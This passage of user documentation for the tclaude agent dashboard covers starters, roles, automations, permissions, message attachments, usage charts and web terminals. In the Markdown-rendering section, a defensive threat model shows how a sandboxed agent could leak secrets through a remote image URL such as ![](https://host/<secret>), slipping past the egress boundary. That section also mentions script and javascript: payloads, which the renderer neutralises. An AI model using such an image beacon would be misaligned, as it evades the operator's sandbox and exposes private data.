deploy a working team without writing a template first. The templates overlay's
**⭐ starters** button opens a dialog listing them; each starter is a worked
example of the whole feature set — role references, per-agent launch tuning, a
process, staged-spawn waves, a seeded rhythm, and a routed work pattern.

Each row's **⤓ copy to my templates** button (**⭐ copy into my circles** in
wizard mode) **copies that starter into your own templates list** — it does
**not** spawn a team. Once copied it is an ordinary template you deploy or edit
from the list like any other. (This is a deliberate two-step: a starter is a
static, editable *blueprint* to adopt, not a one-click launch.)

| Starter | Team | Flow |
|---|---|---|
| `dev-squad` | lead · designer · dev · reviewer · tester | design → implement → review → test → ship (lead on `opus`, tester on `haiku`, reviewer reviews cold) |
| `research-pod` | coordinator · 3 researchers · critic | scope → research → adversarial verify → synthesize |
| `review-crew` | lead · 3 diverse-lens reviewers · synthesizer | scope → review (correctness / security / simplicity) → synthesize |

Copying a starter is **idempotent and never clobbers**: if a template of that
name already exists, the copy is skipped (your edited copy is sacred) — pass a
different name to copy in a fresh one. Starters work on a fresh empty install.

From the CLI:

```bash
tclaude agent templates starters ls                     # list the bundled starters
tclaude agent templates starters show dev-squad         # inspect one in full
tclaude agent templates starters install dev-squad      # install it as a local template
tclaude agent templates starters install dev-squad --as my-squad  # install a fresh copy
tclaude agent task-force deploy dev-squad --mission "…"  # then deploy it against a mission
```

### Roles library

Open it from the Groups tab's filter-bar cog (**⚙ → ⧉ roles…**; **⧉ classes…**
in wizard mode). A **role** is a named, reusable behavior and access preset: a
canonical **role brief** (folded into startup context under a `## Role` block)
and a baseline **permission set**. It deliberately carries no harness, model,
effort, sandbox, approval, tool-governance, or spawn-profile setting; those
remain launch policy owned by spawn profiles and launch controls.

One or more roles can be selected in the direct spawn dialog or saved in a
spawn profile; a template agent can reference one directly through `role_ref`
and can inherit a profile's complete role set. Their briefs and permission
grants compose. This is distinct from the freeform `role` **label** (for
example `tech-lead`), which is display/routing text and carries no defaults.
Role chips can be hovered or clicked to inspect their description, brief, and
grants. The spawn dialog's **Permissions…** editor shows the fully composed
result—including global and group defaults, every selected role, ownership,
and explicit overrides—with the source of each effective grant.

Each saved role is fully **editable** from this dialog (**+ new role** /
per-card **edit** / **delete**). The template editor's role picker also shows
an inline inspect panel with the role's description, permission slugs, and
expandable brief. The same view is available from the CLI with
`tclaude agent roles show <name>`.

**Roles resolve at spawn time.** A template stores a role name in `role_ref`;
a profile stores its role names in `role_refs`. Current briefs and permissions are read when an agent is
spawned. Editing a role therefore changes future spawns, not running agents.
Deleting a role is refused while any template or spawn profile still references
it; the dialog identifies those references so they can be dropped or repointed.

tclaude ships six **seed roles** — `po`, `lead`, `dev`, `designer`, `reviewer`,
and `tester` — as short, generic starting points. Their briefs are sensible
defaults, not policy, and their permissions are deliberately empty. The seeds are
**self-healing**: they are re-checked on every daemon start, so a seed you
delete (once no template references it) reappears on the next open — but **your
edits are sacred**, never overwritten by the re-seed. Edit a seed to taste, or
add your own roles, and they stick. (The name `all` is reserved — it is the
work-pattern broadcast target — so you cannot create a role called `all`.)

### Processes

Visible only when the experimental Processes feature flag is on. The tab and
its REST surface expose the template library and drag-and-drop editor: template
creation, validated CAS saves, versions, parameters, performers, layout,
snippets, authorship, deletion, and scoped process scribes.

The legacy execution engine and its Runs, Worklist, viewer, and instantiation
surfaces have been removed. Runtime execution is temporarily unavailable while
the replacement engine is designed. See [Processes](processes.md).

### Automations

One table with subviews for exports, recurring **Cron jobs**, and durable
**Standing orders**.

The scheduled-job rows show name, owner, target, interval, immediate-run
opt-in, last run, status, and body summary. Per-row buttons: enable/disable,
**run now**, edit, duplicate, and delete. New jobs wait for their first
scheduled due time by default. The create/edit form can opt into one immediate
run; on edit, only an off→on transition fires, so repeat saves and daemon
restarts cannot replay it. **+ new cron job** opens a create form (also
reachable pre-filled from the **⏰ schedule…** items in the Groups tab's group
and member menus). See [Agent Coordination → cron](agent.md#cron).

Standing-order rows show the stable agent or group target, instruction,
trigger, required delivery timing, capability, and latest evaluation.
**+ new standing order** creates one; each row can be edited, enabled/disabled,
or deleted. The first authoring surface deliberately exposes only the trigger
semantics the evaluator already implements:

- a session boundary (optionally filtered to startup, resume, clear, and/or
  compaction), a submitted user prompt, or the before/after boundary of a tool
  call;
- an optional RE2 expression over one event-appropriate normalized field:
  working directory, prompt text, tool name, or compact-JSON tool input.
  Expressions are validated before save and are case-sensitive unless they
  include an RE2 flag such as `(?i)`;
- either same-continuation hook context or next-turn message delivery as a
  required guarantee (an unsupported harness reports a visible non-delivery,
  rather than silently weakening the guarantee);
- every matching boundary or once per conversation generation;
- an optional minimum interval between successful deliveries to each stable
  recipient agent. The cooldown follows the agent across `/clear` and
  reincarnation rather than resetting with its conversation ID.

Action triggers use the inline hook-context channel on Claude Code and Codex.
OpenCode projects the equivalent events from its observation-only SSE stream,
including `session.compacted` as the portable compaction boundary. Orders that
explicitly accept next-turn timing use the durable message queue; the delivered
turn carries a trusted origin marker so an automation-created prompt or tool
turn cannot trigger itself. Same-continuation remains visibly unsupported on
OpenCode: its currently released plugin interception seams are experimental,
and tclaude does not install one implicitly or let a beta plugin failure break
the intercepted model request.

Single-agent targets are persisted by stable `agt_…` ID, never by conversation
generation. Editing an agent-authored order preserves its author and lifecycle
ownership. Re-enabling an automatically retired order requires confirmation
and clears its retirement marker explicitly.

### Sudo

Active **time-bounded permission elevations**. Shows who holds what, the reason,
and the expiry. The human can proactively **grant** an elevation to an agent or
**revoke** one early. See
[Agent Coordination → sudo](agent.md#permissions-sudo) for the
elevation model.

### Links

**Inter-group communication links** — directed edges that let one group's
members message another group's members without co-membership. Add, edit the
mode of, and remove links here.

### Permissions

Every permission slug, expandable to the list of agents that currently hold it
(via defaults, active-group grants, per-conv grants, or active sudo elevations).

### Slug registry

The full registry of known permission slugs with their descriptions — the
browser equivalent of `tclaude agent permissions slugs`.

Each real group's ⚙ menu also has **🔑 group permissions…**. These are live,
additive membership grants: every current member receives the selected slugs
immediately, and leaving or archiving the group removes that source. This is
separate from spawn-profile permissions, which are birth-time agent overrides.
Group policy is allow-only so membership in several groups composes as a union;
an explicit Deny on an individual agent still wins.

The same dialog carries the group's **owner-bypass narrowing** as a small JSON
box: `{"groups.members.spawn": {"spawn_profile": ["reviewer"]}}` confines what OWNING
this group confers by itself, without touching any explicit grant an owner
holds. Empty means the unrestricted bypass. Saving sends it on the same PATCH
as the grants above, and the daemon rejects a map naming an unknown slug or a
dimension that slug does not declare. See
[Owner-bypass narrowing](agent.md#owner-bypass-narrowing).

### Messages

Notifications agents have sent the human via `tclaude agent notify-human`
(see [Agent Coordination → bundled skills](agent.md#bundled-skills)). Each row
shows the sender, group, subject, and body; the nav tab carries an
unread-count badge. **✓ mark all read** clears the badge; **🧹 clear read**
deletes every already-read message. It is the human's side of the
human-notify channel — an explicit nudge surface kept separate from the busy
terminal. When the badge shows waiting work, selecting **Messages** opens the
oldest pending access request, or the oldest unread notification when no access
request is pending. An agent can add `--attach <path>` (repeatable) to publish
a generated file, directory, or set of files. The message reader shows one
download card per published file. Up to 20 attached files arrive as separate
downloads — so an image stays viewable instead of being buried in an archive —
while a directory or a larger set is packaged as one zip. `--zip` and
`--separate` force either shape, and `--name` (which renames a single download)
implies `--zip`. A notification that publishes a file may carry a subject and
no body at all — the artifact is then the message. Where the body would be,
the reader says so ("the attached file is the notification") rather than
leaving a blank gap above the download card.

Daemon-verified PNG, JPEG, GIF, WebP, and AVIF attachments also
show a contain-fit thumbnail. Selecting the thumbnail opens the shared image
preview overlay, which supports zoom, authenticated missing-file checks, and
Escape-to-return while keeping the original download action available. SVG
and other non-raster files remain download-only.

Both attachment viewers are **resizable**: a corner grip drags the dialog to any
size between a small floor and the viewport, arrow keys resize it from the
keyboard, and double-clicking the grip (or pressing Home on it) restores the
default. Each viewer remembers its own size — a screenshot and a report do not
want the same shape — server-side under `tclaude.dash.attachmentViewer.*.size`,
so it survives a reload, a daemon restart, and a different browser profile. On a
narrow viewport the viewers are already full-screen, so the grip is hidden.

Both viewers are chrome opened from the notification surfaces, so they re-skin
with the shell: the grimoire under the wizard theme, the casino under slop,
including the rendered document's own colours and the stage's scrollbar. The
dialog chrome stays under the two overlay classes; the rendered document is
themed unscoped, because the same document renders in the message card as well
as in the viewer and `.markdown-document` has no consumer outside these
notification surfaces. Note that the page-level
`body.wizard header` / `body.slop header` rules are bare element selectors meant
for the page banner, so a dialog `<header>` needs to undo them explicitly.

A published **Markdown document** gets the same treatment in reading form. A
file the daemon recognises as Markdown — by a `text/markdown` or
`text/x-markdown` media type, or by a `.md`/`.markdown`/`.mdown`/`.mkd`/`.mkdn`
name, at most 1 MiB, and whose leading bytes are UTF-8 text rather than binary —
is **rendered in the message itself**, on its own row inside the attachment card:
headings, lists, tables, fenced code, block quotes, links, and images. A report
an agent wrote to be read is the content of that notification, so it is not put
behind a control. The card keeps its file line, size, and download link above the
document, and adds a **View** control that opens the same modal viewer an image
attachment gets, for a document the message column is too narrow to read. It
lands on the rendered document; the original Markdown is a click further, on the
viewer's own Rendered/Source toggle. The card carries one control rather than
two because that toggle already switches between the modes, and the card — a
filename, a media type, a size, a download link — has no width to spare. Both the quick notification reader
and Messages render it, and both share the same components.

The document is fetched when the message is shown; a file the cleanup already
removed, or one that cannot be read, says so in the document's place and leaves
the download link alone.

Rendering is done by the vendored [markdown-it](https://github.com/markdown-it/markdown-it)
parser (`dashboard/vendor/markdown-it/`), loaded on demand so the dashboard's
boot graph does not carry its ~130 KiB. The dashboard never asks the parser for
HTML: it walks the token stream into a plain tree of allowlisted elements and
attributes and renders that as Preact vnodes, so a document's own `<script>` or
`onerror=` reaches the operator as visible characters, and a `javascript:` or
`data:text/html` target never becomes a link. Document links open in a new tab
with `rel="noopener noreferrer"`, and only absolute `http(s)`/`mailto` targets
become links at all — a relative or fragment target would resolve against the
dashboard's own origin rather than the repository its author meant, so it keeps
its text and loses the anchor.

A document can carry **images**, from three places, which the viewer does not
treat alike.

A self-contained `data:` raster URI renders on sight — it reaches nothing —
but only for GIF, PNG, JPEG, and WebP. Any other `data:` image, AVIF included,
is refused as a link target by markdown-it itself, which admits exactly those
four, so the document shows the reference as written rather than the picture.
An AVIF published as an attachment does render, so attach one rather than
inlining it.

A reference to a **file published with the same notification** renders too: an
agent that runs `notify-human --attach report.md --attach chart.png` can write
`![the chart](chart.png)` in the report and have the image appear in the
document. The reference is matched against the published filenames — after
percent-decoding, ignoring a leading `./`, ignoring case, and, if nothing
matched, ignoring a trailing `?query` or `#fragment` — and resolves to that
file's own authenticated download route on the daemon. Only files the daemon
has confirmed are raster images (the same content-sniffed `previewable` verdict
behind the attachment thumbnail, SVG excluded) can be referenced this way; a
reference to anything else, or to a name nothing published, degrades to the
image's alt text. So does a name that two published files both answer to —
published twice under one name, or under names differing only in case or in
percent-encoding — since it identifies neither, and showing one of them would
be showing whichever happened to be attached first.

A **remote `http(s)` image** is described rather than fetched. It renders as a
placeholder carrying the alt text and the host, with a **Load image** button;
the request happens when the operator clicks it, and not before. A document
holding back more than one placeholder gets a single line above it offering to
load them all; loading is by URL, so a document showing the same image twice
resolves both from one click. Once loaded, the image is requested with
`referrerpolicy="no-referrer"`.

Only a target naming its own authority — `https://host/path` — counts as
remote. `https:path` has a scheme but no `//`, and the browser resolves that
against the dashboard's own base rather than as a remote address, so the host a
placeholder named would not be the host contacted; such a target degrades to
alt text with everything else.
The reason for the click is that an `<img>` is the one thing in a document that
reaches the network without the operator doing anything, and the document's
author is an agent that may be running behind tclaude's own egress boundary
(see [Linux network filtering](linux-network-filtering.md)). Rendered eagerly,
such an agent could write `![](https://host/<secret>)` and have the operator's
unfiltered browser make the request it could not — carrying data out around the
sandbox the operator configured, and revealing that (and when) the report was
opened. Suppressing the referrer would hide which host asked, not that the
request happened, so the viewer makes no request the operator did not choose.

Every other `src` — a relative name matching nothing published, an absolute
path, a protocol-relative `//host/x`, a `data:` URI that is not a trusted
raster type — degrades to the alt text, for the same reason the equivalent link
targets lose their anchor.

The daemon copies the bytes into its private data directory, so remote
dashboards download through an authenticated route rather than receiving access to the agent's filesystem.
Deleting the message deletes its stored artifact too. Uploads are capped at
256 MiB each, 512 MiB per stable agent, and 2 GiB daemon-wide; the CLI rejects
top-level symlinks and asks the agent to pass the resolved path explicitly.
Count caps of 1,000 published files per stable agent and 10,000 daemon-wide prevent
empty or tiny files from exhausting database rows and filesystem inodes.

The three mail panes are keyboard-navigable the way a desktop mail client is.
From either filter, **↓** enters and selects the first rendered result; **↑**
or **Esc** on that first row returns to its filter. Within the folder sidebar
or message list, **↑ / ↓** move by one row, **Home / End** jump to the first
or last row, and **PageUp / PageDown** move by one visible viewport of rows.
The folder sidebar follows painted order, so an expanded group's members are
simply part of the path; its group caret remains the dedicated expand/collapse
control.

Bare **← / →** move between the folder sidebar, message list, and reading
pane. The reader is focusable and keeps the browser's normal **↑ / ↓**
scrolling. Every row-navigation key clamps to the page currently rendered and
never turns a server page, so use the pager to move through the whole mailbox.
Navigation keys with a modifier held (**Ctrl**, **Alt**, **Shift**, **⌘**) are
left to the browser.

After upgrading tclaude, run `tclaude setup --install-agent-skills` to refresh
the bundled `human-notify` skill so agents discover the `--attach` workflow.

### Usage

Subscription accounts get an account-wide **Usage** tab once Claude, Codex, or
GitHub Copilot has supplied a quota reading. Copilot's installed CLI normalizes
the authenticated account allowance; agentd samples its finite monthly
premium-request (AIC) quota every 15 minutes. Unlimited Copilot plans have no
percentage ceiling and therefore add no graph. The CLI payload's raw timestamp
is not used as a reset time; Copilot's countdown follows GitHub's
[documented calendar-month boundary](https://docs.github.com/en/copilot/concepts/billing/usage-based-billing-for-individuals)
(the first day at 00:00 UTC; GitHub documents the
[same boundary for legacy premium requests](https://docs.github.com/en/copilot/reference/copilot-billing/request-based-billing-legacy/monitor-premium-requests)). OpenCode
provider/model activity also reveals the tab even when it cannot supply a quota
reading. It plots the retained
15-minute samples as one line chart per provider and quota window, with
24-hour, 7-day, 30-day, and 90-day history views. A separate 5-hour, 24-hour,
7-day, or 30-day lookahead controls the future portion of every chart without
refetching its history. The selected history and lookahead ranges are dashboard
preferences and persist across daemon restarts.

OpenCode does not export provider-account usage-limit history. Native samples
are absolute readings of the account quota rather than deltas, so a sample
taken after an OpenCode turn already includes that turn's spend; only OpenCode
activity newer than the newest native sample is missing from the graphs. The
tab warns when OpenCode activity for OpenAI or Anthropic in the selected
history span outruns the newest matching native Codex or Claude sample, unless
that sample is itself less than one and a half sampling intervals old — enough
slack that a sample still in flight behind a live OpenCode session is not
reported as a gap, while a sampler that has stopped stops being forgiven.
A span holding no native sample at all for that provider, or holding only
operator-excluded ones, always warns. The warning names the affected provider
and models, reports how far the activity outran the newest native sample, and
does not hide any available graphs. It disappears once native sampling catches
up. Unknown OpenCode providers have no native source at all, so their activity
always warns, and they remain unattributed rather than being guessed.

The dashed line estimates the current post-reset consumption rate and compares
the projected 100% time with the provider's reported reset time. Hovering the
forecast reports its interpolated percentage and time plus the remaining time
before reset. Samples, the current-time marker, and detected or scheduled reset
markers use the same immediate tooltip, including exact timestamps and relative
reset timing. Upcoming reported resets inside the selected lookahead are drawn
as vertical reset lines. The summary below each chart states when the limit is
predicted to be hit, any resulting time without quota access, and the average
usage rate in percentage points per hour. A declared
reset boundary or a downward step of at least two percentage points begins a
new segment; the observed post-reset percentage is used as its baseline, so an
out-of-cycle reset does not need to be sampled at exactly 0%. Forecasts wait
for at least three post-reset samples spanning 30 minutes, and pause when the
provider's declared reset has passed or the latest sample is over two hours
old. Long views are downsampled for display while forecast calculations still
use the full retained series. Provider quota data is account-wide and does not
reliably attribute consumption to individual models, so forecasts are per
provider and window rather than per model.

The Groups header uses the same current readings as a compact provider-row
glance. Claude, Codex, and Copilot rows are always named, even when only one is
available. Real API-cost rows are likewise attributed (`Anthropic API`,
`OpenAI API`, and so on) instead of collapsing a single source into an
ambiguous bare `api` figure.

### Debug

Daemon self-diagnostics — hidden by default; enable it with the **Debug tab**
checkbox on the Config tab (`dashboard.show_debug_tab`). It shows how long the
dashboard's own background polls take inside `agentd`: one card per polled
endpoint with a latency sparkline plus p50/p90/p99/max chips, and for
`/api/snapshot` a per-phase breakdown (median composition bar + aggregate
table) that points at the dominant phase of a slow poll. Timings are recorded
in daemon memory regardless of the toggle (newest ≈ 34 minutes at the 2s
poll; reset on daemon restart), so the history is already there when you
switch the tab on.

### Config

A visual editor for `~/.tclaude/data/config.json`, covering the settings this
build of tclaude recognises. Edits are staged in the form until you press
**Save changes**, which shows a confirm diff before anything is written. Most
settings apply on next use; a few resolved at `agentd` startup (spawn
rate-limit, clone cooldown) take effect only after an agentd restart.

The **Usage, costs & rate limits** section controls the top-bar Claude
subscription bars and OpenCode WHAT-IF pricing.
By default agentd does **not** periodically call Anthropic's usage API; it uses
Claude Code's statusline callback when sessions run and otherwise shows the
last cached reading for `usage.idle_timeout` (default `72h`). Enable
`usage.poll_anthropic_api` there only if you want background API refreshes while
no statusline callback is active.

For OpenCode provider catalogs that expose the legacy
`experimentalOver200K` price shape, tclaude applies that price only when one
model call's input-plus-cache context exceeds
`opencode.legacy_long_context_pricing_cutoff` (default `272000`). Exactly at
the cutoff remains base-priced. Explicit context tiers in the provider catalog
always take precedence, and separate model calls in one message are evaluated
independently. A missing, zero, negative, or malformed value falls back to
`272000`; the Config editor rejects a non-positive value before saving.

The **Default terminal** toggle (`dashboard.default_terminal`) chooses where
dashboard focus/open actions appear. Its default, `native`, opens or raises OS
terminal windows. Selecting web terminals routes per-agent focus, open-window,
open-terminal, spawn **Auto focus**, and bulk focus from the **🪟 windows…**
modal or command palette into panes in the dashboard's **Terminals** tab. Bulk
unfocus still detaches the selected terminal clients and closes matching web
panes; it never stops the agents.

On the Groups tab, **Ctrl-click** or **Cmd-click** the Remote Access phone
indicator or **web window** action to open that web terminal in the background.
The same modifier behavior applies to the per-agent **focus** button when web
terminals are the default or that agent already has a web pane. The Terminals
tab appears and collects each pane, but the dashboard stays on Groups so several
agents can be opened before switching tabs. Either modifier is accepted on
every supported desktop platform.

The Terminals tab is deep-linkable: viewing an agent's terminal puts that
agent's id in the address bar as `/terminals/<agent-id>`, so the URL is
bookmarkable and survives a hard refresh. On reload the dashboard reattaches
that one terminal — the other panes that were open cannot be recreated, since
nothing about them is stored outside the page. Back and Forward move between
terminals you have viewed. A link naming an agent the daemon no longer knows
about falls back to the Groups tab rather than leaving you on an empty tab.

Collecting terminals in the background with **Ctrl-click** or **Cmd-click**
does not move the address bar: those panes are gathered without switching to
them, so the URL keeps describing the tab you are actually looking at. When a
pane closes underneath you — an agent retires, or a bulk unfocus closes it —
the URL follows to whichever terminal you land on, but that does not become a
Back step, since you never asked to go there.

An agent terminal pane also has a **✉ Message** button. Pressing
**Ctrl+M** or **Cmd+M** anywhere on the active Terminals tab—or in a terminal
detached into its own browser tab/window—opens the same composer with the
active pane's agent locked as recipient. The composer accepts text, files,
drag-and-drop, and pasted screenshots; **Ctrl/Cmd+Enter** sends. The message is
stored in the agent's mailbox and handed to its normal asynchronous delivery
queue rather than typed through xterm, so terminal output and agent nudges
cannot race with the operator's draft. Offline and busy agents keep it queued.
The composer can be resized from its lower-right corner and remembers that
size. After any text or attachment change, backdrop click, Escape, and Cancel
ask before discarding the draft. Wizard mode gives the composer the same
missive-themed purple-and-gold treatment as the rest of the dashboard.

**Ctrl+K** / **Cmd+K** stays terminal-owned while a web terminal has focus, so
the harness can use it to clear the current input line. To make that chord open
the dashboard command palette from inside web terminals instead, opt into the
experimental `features.terminal_command_palette_shortcut` setting in the
config file or the Config tab. The shortcut continues to open the command
palette normally when focus is outside a terminal.

Every dashboard **Browse…** directory action uses one shared chooser. On a
loopback/localhost dashboard it opens the host's native OS dialog by default.
For a dashboard reached through any non-loopback hostname it automatically
uses an in-dashboard directory navigator backed by agentd, so the operator can
browse paths on the daemon host without needing physical access to its desktop.
Set `dashboard.default_directory_picker` to `"web"` (or enable **Directory
picker** in the Config tab) to use the browser navigator on localhost too.

While any web-terminal pane is open, the dashboard requests browser
confirmation before closing, reloading, or navigating away (including
**Ctrl+W** / **Cmd+W**). Supported desktop browsers generally show this prompt
after the user has interacted with the page, but browser and mobile lifecycle
rules may suppress it. Browsers supply the confirmation text, so it may refer
generically to unsaved changes rather than naming the open terminal. Closing
the last pane removes the guard; an idle dashboard never prompts.

Right-click a terminal tab to **Detach tab**, **Close tab**, **Close other
tabs**, or **Close all tabs**. **Detach tab** is the context-menu twin of the
pane header's **⧉ tab** button: it moves that terminal into a standalone browser
tab. Keyboard users can focus a tab and press **Shift+F10** or the keyboard's
context-menu key, then use the arrow keys and Enter. The close actions only
close the browser terminal views; the underlying agents and tmux sessions keep
running. In wizard mode the same menu uses the terminal strip's purple-and-gold
portal styling.

Each terminal pane's **⧉ tab** button moves that terminal into a standalone
browser tab. The standalone header's **↩ dashboard** button moves it back to
the exact dashboard tab that opened it, then closes the standalone tab. If the
original dashboard is no longer available, the standalone tab becomes a full
dashboard at `/terminals` and reopens the pane there instead. Browser focus is
best-effort, so a browser that blocks focus-stealing may require selecting the
dashboard tab manually.

New web-terminal clients use a short, bounded initial retry window. This lets a
first launch, pop-out, or reattach settle after a freshly-started tmux session
or a replaced browser client finishes tearing down. Once the connection has
been stable for a second, later disconnects keep the explicit **Reconnect**
control; they never enter a permanent automatic retry loop.

Restarting `agentd` is the one exception, because it is the one disconnect a
terminal can prove. Every web terminal's connection dies with the daemon while
the tmux session behind it keeps running, so a reattach is exactly the right
move — but from the browser's side that looks identical to the ordinary reasons
a terminal closes (the session ended, the terminal was reopened in another
window, you closed it elsewhere), where reattaching would steal back a terminal
you deliberately moved.

`agentd` publishes an instance id at `/api/instance` that is fixed for the life
of the process and necessarily different in the next one. A terminal remembers
the id it connected under, and when its connection settles as disconnected it
asks that endpoint what the daemon was doing when the connection was lost:

- **It answers with the same id.** The daemon was alive and unchanged, so it is
  not what closed this terminal — something else did. This terminal is never
  reattached automatically, no matter how many restarts follow. That is the case
  where you moved the terminal somewhere else deliberately.
- **It answers with a different id.** The daemon already restarted. Reattach.
- **It does not answer.** The daemon is gone. Keep asking — roughly once a
  second at first, then backing off — and reattach once it comes back as a
  different process.

Waiting terminals share a single poll, which gives up after about 38 attempts
(~80 seconds of the tab being visible). A hidden browser tab does not poll at
all — it checks the moment you look at it again, so the budget is spent on time
you are actually waiting.

A reattach that itself fails goes back to needing a further restart, and once
the budget runs out the terminal keeps only its **Reconnect** control. The
fullscreen terminal modal opts out entirely: it already asks you what to do when
its connection drops, and answering that question is the reconnect.

None of this depends on the dashboard's own connection state, so a standalone
pop-out behaves exactly like a pane in the Terminals tab.

Terminal tabs can be dragged within the tab strip to reorder them. The insertion
line shows whether the drop will land before or after the tab under the pointer.
For a keyboard path, focus a terminal tab and press **Alt-Shift-Left Arrow** or
**Alt-Shift-Right Arrow**. Reordering leaves the active terminal and every live
terminal connection unchanged.

Dragging a terminal tab *off* the strip detaches it, and dragging the standalone
header's title off that header reattaches it — the drag equivalents of **⧉ tab**
and **↩ dashboard**, running the exact same handoff. A browser never tells a page
that a drag ended over some other window, so the gesture is inferred from where
the drag was released: clear of the tab strip (or the standalone header) by a
margin wide enough that a sloppy reorder cannot trigger it. Once the pointer is
past that margin the region dims and states what releasing will do; a drag
cancelled with **Escape**, or released inside the margin, changes nothing.

While a terminal drag is in flight the dashboard page accepts it everywhere, so
the pointer shows a move cursor rather than the browser's "no drop" sign — a page
that has not explicitly accepted a drag is drawn as if it would refuse one, which
made a gesture that works look like one that cannot. Accepting is scoped to a
live terminal drag and never overrides a target that already claimed the event,
so the tab strip's own reorder edges keep their meaning. Once the pointer leaves
the browser window the cursor belongs to the operating system and cannot be
styled by a page; releasing there still detaches, which is why the hint says
release *anywhere*.

Where a detached terminal lands depends on how it was detached. A **drag** off
the strip opens a separate browser *window*, sized to the pane the terminal is
leaving and positioned where the drag was released — dragging a terminal out is
a request to get it out of the way,
which another tab behind the dashboard would not satisfy, and matching the pane's
size means the terminal keeps its columns and rows instead of reflowing on
arrival. The **⧉ tab** button and the context menu's **Detach tab** keep opening
an ordinary browser tab. Both are the same handoff to the same standalone page;
only the window request differs. Browsers treat that request as a hint: a setting
that forces new windows into tabs, or a screen too small for the asked-for size,
quietly wins, and the terminal works either way.

A release inside the dashboard's own display is kept fully on that display. A
release *beyond* it — onto a second monitor — is passed through untouched, so the
window opens where it was dropped. A page can only measure the display it is
already on, so the browser does the final placing in that case; without the
permission-gated Window Management API the dashboard cannot know the other
monitor's geometry, and clamping against the wrong one would drag the window back
to the monitor the operator just left.
Because the rule is conservative rather than clever, anything it does not
recognise simply falls through to the explicit buttons and the tab context
menu, which remain the dependable and keyboard-accessible path.

Detaching — by drag, by **⧉ tab**, or from the context menu — needs a new browser
tab, so a browser that blocks pop-ups for the dashboard cannot complete it. The
terminal then stays exactly where it was, still connected, and the dashboard
says so rather than appearing to lose the drag.

Opening a terminal appends its tab after the tabs already open. Closing and
reopening a terminal also gives it a fresh position at the end instead of
reviving stale order history. A terminal with remembered group membership
instead appends within that group, keeping the group contiguous. Drag and
keyboard reordering affect the current terminal strip; group membership remains
the persisted presentation preference described below.

### Terminal tab groups

Terminal tabs can be collected into named, collapsible **groups** — coloured
stacks inside the same strip, for keeping the terminals of one piece of work
together when many are open. Groups are created and named by the operator; they
are not derived from tclaude agent groups, so a group can hold whatever mix of
agent terminals and shells the work actually needs.

A group is always a *contiguous* run of tabs. Every operation that could break
that — creating a group, joining one, reordering across one — pulls the members
back together next to the first of them, so what the strip shows and what a drag
or a keystroke will do never disagree.

* **Create** — drop one tab onto the **middle** of another to combine the two
  into a new group; the target tab lights up while the pointer is over its
  grouping zone so the outcome is clear before release. A tab's context menu
  (right-click or **Shift-F10**) offers the same as *New group from this tab*,
  which also opens the new name for editing.
* **Join and leave** — each tab has three drop zones: the outer quarter on
  either side reorders the dragged tab before/after it, and the centre half
  groups them. Dropping on the centre of a tab that is already in a group joins
  that group; dropping on the outer edges reorders and adopts that tab's
  membership (so a drop among ungrouped tabs leaves the group). Dropping onto
  the group's pill joins at the end of the group. The context menu carries the
  same moves as *Add to "…"* and *Remove from group*.
* **Parking beside a group** — the one position a drop onto a tab cannot express
  is directly before a leading group, or between two adjacent groups, since the
  only tab there belongs to a group and dropping on it would join. While a drag
  is in flight a thin drop lane appears at each group boundary; releasing on it
  parks the tab there, ungrouped. The keyboard reaches the same positions by
  hopping a whole group.
* **Keyboard** — **Alt-Shift-Left/Right Arrow** steps a tab between its siblings
  inside a group and, at either edge of the group, steps it out of the group.
  An ungrouped tab hops over a whole group rather than landing inside it, which
  the contiguity rule would immediately undo. Each move is announced in the
  strip's live region, including the group it moved into or out of.
* **Move the whole group** — drag the group's pill to relocate the entire stack
  as one block; it drops before/after whatever tab or group it is released on,
  keeping its members and their order. A stack always lands *beside* another
  stack, never nested inside it. **Alt-Shift-Left/Right Arrow** on the focused
  pill is the keyboard equivalent, hopping the stack over one neighbouring
  segment per press; focus follows the moved pill.
* **Collapse** — clicking the group's pill collapses it to the pill alone.
  Collapsing over the terminal you are looking at moves activation to the
  nearest tab outside the group; when there is no such tab, the active member
  stays visible in the collapsed group rather than the strip losing its
  selection. Activating a member of a collapsed group re-expands it.
* **Rename** — double-click the group's pill, or focus it and press **F2**, to
  edit the name inline; **Enter** commits, **Escape** discards. The pill's
  context menu also offers *Rename group*. So a double-click never collapses the
  group first, a pointer click on the pill waits a moment (the double-click
  grace period) before collapsing; a keyboard **Enter**/**Space** collapses
  immediately, since there is no double-click to wait for.
* **Ungroup, close** — the pill's own context menu dissolves the group
  (*Ungroup tabs*, which keeps every terminal and its position) or closes the
  terminals in it.

Group descriptors and membership are stored as a presentation preference, so
they survive reloads and are shared by every dashboard client. Membership is
remembered for terminals that are not currently open: closing every tab of a
group and later reopening one restores it to its group. A group whose last
member explicitly *leaves* it has nothing left to render, drop onto, or name,
and is dropped. Stored groups are bounded to 24 groups, 40-character names and
60 KiB.

In 🧙 wizard mode, the Terminals tab and its popped-out browser terminals use
the same purple-and-gold portal chrome as the rest of the dashboard. Each pane
header has an **Arcane palette** checkbox beside **Copy** and **⧉ tab**. It
recolours xterm's background, cursor, selection, and standard ANSI palette; it
does not rewrite explicit RGB colours chosen by terminal applications.
Unchecking it restores the neutral terminal palette everywhere. The choice is
shared by all web-terminal panes and persisted in the dashboard preferences, so
new panes and later dashboard sessions inherit it.

Web terminals support the same everyday interactions as native terminal
windows. An unmodified drag handled by tmux copies the selected text into its
paste buffer and, when the browser grants clipboard access, into the browser
clipboard using tmux's standard OSC 52 sequence. This follows tmux's
`set-clipboard` setting (`external` by default), so explicitly setting it to
`off` disables browser propagation too. The clipboard request begins inside
the drag's mouse event and waits for tmux's response, preserving the user
gesture required by browsers such as Safari. A TUI-owned **Ctrl/Cmd-C** copy
uses the same guarded path: the keyboard gesture arms one response while the
key still reaches the running application. Unsolicited OSC 52 sequences are
ignored; only an explicitly armed mouse or keyboard copy may update the
clipboard.

When Copilot CLI is installed, `tclaude setup` offers to persist its documented
`copyOnSelect: true` preference. An existing value is treated as an operator
choice and left unchanged; the keyboard path above remains available when the
preference is deliberately disabled. Copilot wraps its OSC 52 writes in tmux's
passthrough protocol, so tclaude enables `allow-passthrough` only on Copilot
windows; it does not relax the shared tmux server or other harness windows.

To make a browser-owned selection instead, use **Option-drag on macOS** or
**Shift-drag on Linux/Windows**, then press **Ctrl/⌘-Shift-C** or click
**Copy**. Clicking Copy without a browser selection shows this modifier hint.
HTTP(S) links open with
**Ctrl/⌘-click**; requiring the modifier keeps
ordinary terminal clicks available to the running program. Both kinds of link
work: text that is itself a URL, and an explicit terminal hyperlink whose
visible text is a label rather than an address — the form Claude Code and Codex
use for documents, issues, and sessions. Because a labelled link chooses its
